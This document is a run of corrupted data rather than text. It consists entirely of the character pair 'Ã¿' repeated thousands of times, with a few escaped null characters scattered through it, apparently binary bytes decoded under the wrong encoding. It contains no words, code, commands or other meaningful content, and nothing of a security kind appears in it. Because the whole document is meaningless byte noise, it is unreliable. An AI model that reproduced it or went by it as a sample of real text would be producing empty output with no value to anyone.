¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿